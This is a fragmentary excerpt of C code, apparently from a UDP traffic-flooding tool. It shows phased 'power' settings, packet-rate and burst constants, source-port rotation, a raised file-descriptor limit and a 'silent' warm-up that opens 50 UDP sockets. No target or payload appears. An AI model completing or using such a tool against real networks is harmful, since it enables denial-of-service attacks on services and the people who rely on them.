...
#define BATCH_UPDATE_COUNT 200000

#define PHASE1_TIME 15
#define PHASE2_TIME 10
#define PHASE1_POWER 90
#define PHASE2_POWER 0
#define PHASE3_POWER 100

#define PPS_20BYTE 900
#define PPS_128BYTE 225

#define BURST_SIZE 135
#define MAX_BURST 200

#define PORT_CHANGE_NORMAL 800
#define PORT_CHANGE_DIRECT 3200
...
void optimize_kernel() {
    ...
    system("ulimit -n 999999 >/dev/null 2>&1");
#endif
}
...
void silent_warmup() {
    ...
    for (int i = 0; i < 50; i++) {
        warm_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (warm_socks[i] >= 0) {
            set_sock_buf(warm_socks[i]);
            fcntl(warm_socks[i], F_SETFL, O_NONBLOCK);
            ...
            bind(warm_socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
    ...
    for (int i = 0; i < 50; i++) {
        if (warm_socks[i] >= 0) close(warm_socks[i]);
    }
}
